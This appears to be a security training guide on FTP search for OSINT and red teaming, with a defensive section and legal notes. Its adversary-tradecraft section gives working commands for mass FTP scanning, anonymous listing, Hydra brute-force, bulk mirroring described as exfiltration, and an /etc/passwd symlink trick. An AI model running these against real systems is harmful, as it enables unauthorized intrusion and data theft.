1. What is FTP Search?

FTP search is the practice of locating files, directories and indexed content on publicly reachable FTP servers. These indexes frequently contain installers, backups, documents, or configuration files that were never intended to be widely discoverable, making them valuable for OSINT, penetration testing, and risk discovery.

Operational Note:
FTP search is one of the oldest forms of OSINT discovery. Despite the age of the protocol, misconfigured and anonymous FTP servers remain surprisingly common in 2026.

2. How FTP Search Works

  • Public FTP servers can be crawled and indexed by specialised FTP search engines and general web search engines.
  • Researchers and attackers use crafted queries (Google dorks) and dedicated search engines to find exposed archives (zip/rar), documents (pdf/docx), and plaintext files containing credentials.
  • Automation via scripts (Python ftplib), CLI tools, and metadata harvesters speeds discovery and pivoting to related targets.

3. Useful FTP Search Engines & Platforms (current)

  • NAPALM/SearchFTPS: Active FTP indexer that aggregates millions of files, which is useful for rapid discovery and download of public FTP-hosted artifacts.
  • Mamont (MMNT): Long-running, large FTP index that mirrors open FTP indexes and remains widely referenced in OSINT communities.
  • Other aggregators and lists (GlobalFileSearch, FreewareWeb, FileMare and community-maintained directories) remain helpful. Community lists and subreddit threads frequently point to active mirrors.
Operator Note:
Index freshness (how quickly a search engine discovers, processes, and adds new or updated web content to its database) varies dramatically between FTP search engines. Cross-reference results across multiple engines for comprehensive coverage.

4. Tools & Automation

  • Metagoofil: Metadata harvesting tool (bundled in Kali) to extract authors, usernames and paths from public documents (pdf, docx, xls). Use as a pivot to find internal hostnames or user IDs referenced in files.
  • Command-line scripts using ftplib, crawlers, or scraping helpers can enumerate indexes and bulk-download targets for offline analysis.
  • Combine archive search tooling (Wayback/WaybackUrls, GAU/Katana) with FTP indices to find related archived copies or historical exposures.
Note:
Automation accelerates discovery but also increases the risk of triggering alerts. Use rate-limiting and respect engagement scope.

5. Adversarial Tradecraft: How Threat Actors Weaponize FTP Search

Understanding how real-world adversaries abuse FTP search is essential for defensive operations and authorized Red Team engagements. Threat actors frequently target FTP services because they are often legacy systems, poorly monitored, and misconfigured with anonymous access enabled.
For adversaries, FTP represents a low-noise avenue for reconnaissance, staging, and exfiltration.

a) Adversarial Mindset & Target Selection

Unlike scoped penetration tests, adversaries prioritize accessibility and anonymity. Their FTP tradecraft focuses on:

  • Mass discovery of anonymous endpoints: Scanning wide IP ranges for FTP servers accepting anonymous or weak credentials to establish staging grounds.
  • Metadata harvesting for spear-phishing: Bulk-downloading documents from open FTP indexes to extract author names, software versions, and internal paths.
  • Exploitation of FTP bounce: Abusing misconfigured servers to proxy connections into internal networks or obfuscate attack origin.
Defensive Translation:
By studying adversarial FTP patterns, defenders can prioritize patching or decommissioning anonymous FTP, implement SIEM alerting on anomalous directory listings, and deploy decoy files for tripwire detection.

b) Real-World Adversarial Examples

The following examples are derived from public incident reports and threat intelligence disclosures:

  • Malware Distribution Hubs: Threat actors scanned for anonymous writable FTP directories and staged trojanized installers (.zip, .exe) alongside legitimate software. Victims downloading from public FTP indexes inadvertently executed payloads.
  • Credential Harvesting from Metadata: An adversary used Metagoofil-style extraction on documents harvested from an exposed FTP server to recover internal usernames, printer paths, and Active Directory naming conventions later used in password-spray campaigns.
  • Initial Access via Anonymous Uploads: A ransomware affiliate identified a manufacturing partner with anonymous FTP write access, uploaded a web shell disguised as a backup archive, and pivoted into the corporate network days later.
  • Supply Chain Poisoning: Attackers replaced legitimate firmware files in a vendor's public FTP repository with backdoored versions. The files were indexed by search engines and downloaded by unsuspecting integrators.

c) Adversary Tools & Commands

Adversaries chain open-source scanning tools, scripting libraries, and standard Unix utilities into automated FTP exploitation pipelines.

Phase 1: Build the target list properly 

# 1. ASN -> CIDR (append directly to main file)
#    Note: Use organization name, not domain, depending on your tool.
asnlookup -o "Target Inc" 2>/dev/null >> target_ranges.txt

# 2. Resolve apex domain(s)
echo "target.com" | dnsx -a -resp-only -silent >> target_ranges.txt

# 3. Historical subdomains from certificate transparency
#    Strip '*.'' wildcards before resolving
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | \
  sed 's/^\*\.//' | sort -u | \
  dnsx -a -resp-only -silent >> target_ranges.txt

# 4. Deduplicate and sort (handles both CIDR and individual IPs)
sort -uV target_ranges.txt -o target_ranges.txt

Phase 2: Mass FTP discovery with actual banner grabbing 

nmap -p 21 --open -iL target_ranges.txt \
  -sV \
  --script banner,ftp-anon,ftp-bounce,ftp-syst,ftp-vuln-cve2010-4221 \
  --min-rate 1000 \
  --max-retries 2 \
  -oA ftp_mass_scan

Key additions explained:

Flag / Script Purpose
-sV Performs service/version detection; captures the FTP 220 banner.
banner Generic NSE script to explicitly pull banners from any open port.
--min-rate 1000 Keeps the scan fast across a large -iL list.
--max-retries 2 Reduces retry overhead on firewalled hosts.

Phase 3: Anonymous access validation and directory listing 

# Greppable extract of anonymous-ready hosts from Nmap XML
grep -E "Anonymous FTP login allowed" ftp_mass_scan.nmap | awk '{print $NF}' > ftp_anon_hosts.txt

# Automated directory listing via lftp (non-interactive)
while read host; do
  echo "[*] Listing ${host}"
  lftp -u anonymous,anonymous -e "set ssl:verify-certificate no; ls -R; bye" "${host}" 2>/dev/null
done < ftp_anon_hosts.txt > ftp_anon_listings.txt

Expected output from Phase 3: 

[*] Listing 203.0.113.45
drwxr-xr-x    2 ftp      ftp          4096 Jan 15  2023 incoming
-rw-r--r--    1 ftp      ftp         14220 Jan 15  2023 config_backup.tar.gz
Operator Note:
  • Merge asn_ranges.txt into target_ranges.txt (or write directly to it).
  • Strip *. wildcards from certificate transparency output before DNS resolution.
  • Add -sV (and optionally banner) to the Nmap command for true banner grabbing.
  • Pass an organization name, not a domain, to asnlookup unless your specific fork supports domain lookups.
  • Add timing options (--min-rate, --max-retries) when scanning large IP lists to avoid hours-long scans.

Anonymous access validation and directory listing across all discovered hosts: 

# Iterate over hosts confirmed to have port 21 open and anonymous allowed
while read host; do
  echo "[*] Checking anonymous access on ${host}"
  ftp -n -v "${host}" << EOF
user anonymous anonymous@
passive
ls -R
bye
EOF
done < ftp_anon_hosts.txt

Automated brute-force and file exfiltration: 

# Extract live FTP targets from previous mass scan
grep "21/tcp open" ftp_mass_scan.gnmap | \
  awk '{print $2}' > ftp_hosts.txt

# Hydra FTP brute-force against discovered hosts
hydra -L users.txt -P passwords.txt -M ftp_hosts.txt ftp -t 6 -o hydra_ftp_cracked.txt

# Mirror with passive mode (default) for reliability through NAT
wget --mirror --ftp-user=anonymous --ftp-password=anon@ \
  ftp://ftp.target.com/public/ -P /tmp/staging_area

# Only use --no-passive-ftp if actively exploiting an FTP bounce or
# forcing the server to establish a data connection to a third host.

Python ftplib reconnaissance and bulk download: 

#!/usr/bin/env python3
from ftplib import FTP
import fnmatch

TARGETS = ['ftp.target.com']
KEYWORDS = ('.zip', '.sql', '.backup', '.tar.gz', '.pdf')

def crawl(ftp, path=""):
    try:
        files = ftp.mlsd(path)  # Modern alternative to nlst(); gives metadata
    except Exception:
        files = ((f, {}) for f in ftp.nlst(path))  # Fallback for legacy servers
    
    for name, meta in files:
        full = f"{path}/{name}" if path else name
        if meta.get("type") == "dir":
            crawl(ftp, full)
        elif any(name.endswith(k) for k in KEYWORDS):
            try:
                size = ftp.size(full)
                print(f"  [!] HIT: {full} ({size} bytes)")
                # Exfiltration line commented out for safety
                # ftp.retrbinary(f'RETR {full}', open(name.replace('/','_'),'wb').write)
            except Exception as e:
                print(f"  [-] ERR: {full} | {e}")

for host in TARGETS:
    try:
        with FTP(host, timeout=10) as ftp:
            ftp.login('anonymous', 'anonymous@domain.com')
            print(f"[+] Connected: {host}")
            crawl(ftp)
    except Exception as e:
        print(f"[-] {host} error: {e}")

d) Adversary OPSEC & Evasion Techniques

Sophisticated threat actors apply operational security to FTP-based operations to avoid attribution and detection:

  • Anonymous access abuse: Using generic anonymous or ftp credentials to avoid creating traceable user accounts.
  • FTP bounce / active-mode exploitation: Leveraging legacy servers that support PORT commands to proxy scans or transfers through the victim's infrastructure, masking true origin.
  • Symlink traversal on misconfigured daemons: Following existing symlinks or, if writable, creating symlinks to escape chroot jails (e.g., ln -s /etc/passwd then retrieving via RETR).
  • Compromised intermediary hosts: Routing FTP connections through previously compromised residential or edge systems to avoid direct attribution.
  • Temporal dispersion: Performing reconnaissance and downloads during business hours to blend with legitimate administrative traffic.
Blue Team Note:
FTP logs often record little more than IP, timestamp, and bytes transferred. To detect adversarial use, correlate FTP session volumes with endpoint detection, monitor for off-hours bulk downloads, and baseline expected anonymous access (if enabled at all).

e) Defensive Countermeasures & Detection

Translating adversarial FTP tradecraft into defense requires both attack-surface reduction and behavioral monitoring:

  • Disable anonymous FTP: Eliminate unauthenticated access entirely; require modern authentication or decommission FTP in favor of SFTP/FTPS.
  • Monitor for directory traversal: Alert on FTP commands that attempt symlink following or escape from chroot jails.
  • Detect brute-force patterns: Use SIEM rules to flag rapid sequential login failures or unusual username enumeration against FTP services.
  • Honeypot files: Seed known public FTP indexes with canary documents containing tracking metadata; trigger alerts when opened or processed.
  • Shodan/Censys monitoring: Continuously monitor organizational IP ranges for unexpected port 21 exposure or changes in FTP banners.
Adversarial Insight: The tools used to defend FTP infrastructure are often identical to those used to attack it; Nmap, Hydra, Python ftplib, and wget. The critical distinction is authorization and intent. Defenders who understand adversarial FTP tradecraft can identify misconfigurations before they are exploited, detect anomalous usage patterns, and justify replacing legacy FTP with secure alternatives.

6. Legal, Ethical & OPSEC Notes

  • Accessing truly public, unauthenticated files is generally legal, but using exposed credentials or bypassing protections without explicit written permission is not. Confirm rules of engagement first.
  • Document everything; URLs, timestamps, and how the file was discovered. This makes reporting reproducible and defensible.
  • When you find sensitive information, follow responsible disclosure and the client's data-handling policy. Do not publish leaked or private data.
OPSEC Principle:
The line between public FTP discovery and unauthorized access is thin. If a directory requires any form of authentication beyond anonymous, stop and verify authorization.

10. Key Takeaways

Concept Why It Matters Security Impact
FTP Remains a Persistent Exposure Vector Despite being a legacy protocol, anonymous FTP and misconfigured servers remain common and often contain sensitive data. Regularly audit FTP exposure; decommission or secure anonymous access where possible.
Search Engines Index FTP Content FTP indexes are crawled by both specialized FTP search engines and general web search engines. Proactively search for your own exposed FTP content using the same dorks an adversary would use.
Metadata Extraction Is a Force Multiplier Documents harvested from FTP servers reveal internal usernames, paths, and software versions. Metadata provides actionable intelligence for phishing, credential attacks, and infrastructure mapping.
Adversaries Use FTP for Staging and Exfiltration Anonymous writable FTP directories are frequently used as malware staging grounds or data exfiltration points. Monitor outbound FTP traffic and unusual uploads to detect adversarial activity.
FTP Bounce Can Mask Origin Misconfigured servers supporting PORT commands can be used to proxy attacks through legitimate infrastructure. Disable FTP bounce features and monitor for anomalous PORT command usage.
Document Everything Search results change quickly; reproducible queries are essential for reporting and retests. Auditability supports legal defensibility and peer review.
Automation Requires Responsible Use Scripts accelerate discovery but also increase detection risk and scope creep. Apply rate-limiting, respect robots.txt, and stay within engagement authorization.
FTP Logs Are Low-Fidelity FTP logs often lack detailed user context, making detection challenging. Correlate FTP activity with other telemetry sources (EDR, DNS logs) for effective detection.
Honeypot Files Enable Detection Seeding decoy files in public FTP directories allows defenders to detect when adversaries are harvesting. Trigger alerts on access to honeypot files to identify active reconnaissance.
The Protocol Is Outdated — Plan for Deprecation FTP lacks encryption and modern security features; SFTP/FTPS are secure alternatives. Decommissioning FTP eliminates an entire class of risk and simplifies monitoring.
RedOps Reminder: FTP catalogs mirror mistakes — find them, document them, and never cross the authorization line. The difference between OSINT and intrusion is permission; keep your queries auditable, your findings ethical, and your engagement scope clear.
